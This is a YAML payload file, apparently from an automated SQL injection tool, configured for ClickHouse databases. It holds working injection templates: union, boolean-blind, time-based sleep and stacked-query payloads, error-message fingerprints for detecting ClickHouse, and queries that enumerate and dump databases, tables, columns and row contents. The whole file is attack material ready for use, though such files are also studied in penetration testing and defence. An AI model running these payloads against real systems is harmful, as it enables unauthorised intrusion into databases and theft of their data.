vendor: Clickhouse

resource:
 info: |
  concat_ws(
      '${enclose_value_sql}',
      version(),
      database(),
      user()
  )

 schema:
  database: |
   select group_concat(
       '${enclose_value_sql}'
       ||r
       ||'${separator_qte_sql}'
       ||q
       ||'${enclose_value_sql}',
       '${separator_cell_sql}'
   ) from (
       select database r, count(name) q
       from system.tables
       group by r
       ${limit}
   ) x

  table: |
   select group_concat(
       '${enclose_value_sql}'
       ||r
       ||'${separator_qte_sql}'
       ||q
       ||'${enclose_value_sql}',
       '${separator_cell_sql}'
   ) from (
       select name r, '0' q
       from system.tables
       where database = '${database}'
       ${limit}
   ) x

  # distinct to deduplicate
  column: |
   select group_concat(
       '${enclose_value_sql}'
       ||n
       ||'${separator_qte_sql}'
       ||0
       ||'${enclose_value_sql}',
       '${separator_cell_sql}'
   ) from (
       select distinct c.name n
       from system.tables t inner join system.columns c
       on t.name = c.table
       where t.database = '${database}'
       and t.name = '${table}'
       ${limit}
   ) x

  row:
   query: |
    select group_concat(
       '${enclose_value_sql}'
       ||r
       ||'${separator_qte_sql}'
       ||q
       ||'${enclose_value_sql}',
       '${separator_cell_sql}'
    ) from (
        select
            concat(${fields}) r,
            count(*) q
        from `${database}`.`${table}`
        group by r
        ${limit}
    ) x
   fields:
    field: trim(ifnull(''||`${field.value}`, '0'))
    concat: ",char(0x7f),"

strategy:
 configuration:
  slidingWindow: |
   (select concat(
       '${lead}',
       ifnull(
           mid(
               (${injection}),
               ${window.char},
               ${capacity}
           ),
           ''
       ),
       '${trail_sql}'
   ))
  limit: limit ${limit.value}, 65536
  failsafe: "''||1337${indice}7330%2b1"
  calibrator: repeat('${calibrator_sql}', 65565)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - clickhouse
   orderByErrorMessage:
    - Positional argument number 1337 is out of bounds
   vendorSpecific: multiIf(${test}, 'a', '')='a'

 union:
  indices: union all select ${indices}
  capacity: |
   (
       select concat(
           '${lead}',
           ${indice},
           ${calibrator}
       )
   )
  orderBy: order by 1337

 binary:
  test:
   # reinterpretAsUInt8 to prevent Illegal type Int32
   bit: |
    bitAnd(
        reinterpretAsUInt8(ascii(
            substring(
                ${injection},
                ${window.char},
                1
            )
        )),
        ${bit}
    )
   # ascii() required as char comparison not based on ascii range
   bin: |
    ascii(
        substring(
            ${injection},
            ${window.char},
            1
        )
    )
    %3E%3Dascii(char(${mid.int}))
   truthyBin:
    - ascii(char(97))%3E%3Dascii(char(97))
    - ascii(char(97))%3E%3Dascii(char(65))
    - ascii(char(97))%3E%3Dascii(char(48))
    - ascii(char(98))%3E%3Dascii(char(97))
    - ascii(char(98))%3E%3Dascii(char(66))
    - ascii(char(49))%3E%3Dascii(char(48))
   falsyBin:
    - ascii(char(97))%3E%3Dascii(char(98))
    - ascii(char(65))%3E%3Dascii(char(97))
    - ascii(char(66))%3E%3Dascii(char(98))
    - ascii(char(66))%3E%3Dascii(char(97))
    - ascii(char(48))%3E%3Dascii(char(65))
    - ascii(char(48))%3E%3Dascii(char(49))
  modeAnd: and
  modeOr: or
  modeStack: ; select 1 where
  blind: ${binary.mode} ${test}
  time: |
   ${binary.mode} if(
       ${test},
       1,
       sleep(${sleep_time})
   )
